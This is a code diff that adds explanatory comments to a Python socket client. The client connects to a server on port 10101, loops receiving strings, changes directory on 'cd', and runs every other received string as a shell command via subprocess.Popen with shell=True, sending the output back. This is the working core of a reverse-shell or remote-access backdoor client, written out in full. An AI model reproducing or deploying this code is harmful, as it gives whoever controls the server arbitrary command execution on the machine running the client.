@@ -9,17 +9,21 @@ class Client(object):
     host = ""
     sckt = None
 
+    # initiates the client with the IP address of the server and creates a socket
     def __init__(self, host="127.0.0.1"):
         self.host = host
         self.sckt = socket.socket()
 
+    # connects the socket to the server and prepares the client to receive commands from the server
     def start(self):
         self.sckt.connect((self.host, 10101))
         self.receive_commands()
 
+    # interprets the commands from the server and performs them on the client itself
     def receive_commands(self):
         while True:
             data = self.sckt.recv(4096)
+            # server sends '?' to determine whether the connection with the client is still active
             if data.decode("utf-8") == "?":
                 self.sckt.send("!")
             elif data[:2].decode("utf-8") == "cd":
@@ -33,7 +37,9 @@ class Client(object):
                 self.sckt.send(" ")
             elif len(data) > 0:
                 try:
+                    # commands from the server are run as a subprocess of the client
                     command = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    # output from the commands are returned to be displayed by the server
                     output = str(command.stdout.read() + command.stderr.read())
                     self.sckt.send(str.encode(output) + " ")
                 except OSError as message:
